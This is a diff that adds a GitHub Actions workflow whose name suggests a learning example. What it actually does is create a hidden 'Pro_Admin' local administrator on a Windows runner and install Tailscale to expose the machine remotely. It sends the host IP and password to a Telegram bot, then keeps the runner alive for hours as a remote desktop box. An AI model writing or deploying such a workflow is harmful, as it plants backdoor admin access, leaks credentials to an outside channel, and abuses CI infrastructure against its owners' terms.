@@ -1,0 +1,55 @@
+name: learn-github-actions
+on: [push]
+jobs:
+  check-bats-version:
+    runs-on:
+      group: Custom
+      labels: windows-server
+      
+    steps:
+      - name: Credential
+        id: user_gen
+        run: |
+          $pass = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object {[char]$_})
+          echo "::add-mask::$pass"
+          $secPass = ConvertTo-SecureString $pass -AsPlainText -Force
+          New-LocalUser -Name "Pro_Admin" -Password $secPass -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "Pro_Admin"
+          echo "PASS=$pass" >> $env:GITHUB_OUTPUT
+
+      - name: 🌐  Deployment
+        id: ts
+        run: |
+          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts.msi"
+          Start-Process msiexec.exe -ArgumentList "/i", "ts.msi", "/quiet", "/norestart" -Wait
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=PRO-RDP-$(Get-Random)
+          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+          echo "IP=$tsIP" >> $env:GITHUB_OUTPUT
+
+      - name: SEND
+        run: |
+          # Pesan teks polos tanpa format Markdown agar tidak rewel
+          $msg = "💎 wavingthee SESSION ACTIVE`n`n🚀 Host: ${{ steps.ts.outputs.IP }}`n👤 User: Pro_Admin`n🔑 Pass: ${{ steps.user_gen.outputs.PASS }}`n`n⚡"
+          
+          $body = @{ 
+              chat_id = "${{ secrets.TELEGRAM_CHAT_ID }}"
+              text = $msg
+          } | ConvertTo-Json
+          
+          Invoke-RestMethod -Uri "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" -Method Post -Body $body -ContentType "application/json"
+
+      - name: ⏳ Keep-Alive
+        run: |
+          $start = Get-Date
+          while ($true) {
+            $diff = (Get-Date) - $start
+            if ($diff.TotalMinutes -ge 350) { break }
+            Start-Sleep -Seconds 60
+          }
+
+      - name: 🧹 Cleanup
+        if: always()
+        run: |
+          if (Test-Path "$env:ProgramFiles\Tailscale\tailscale.exe") {
+              & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
+          }
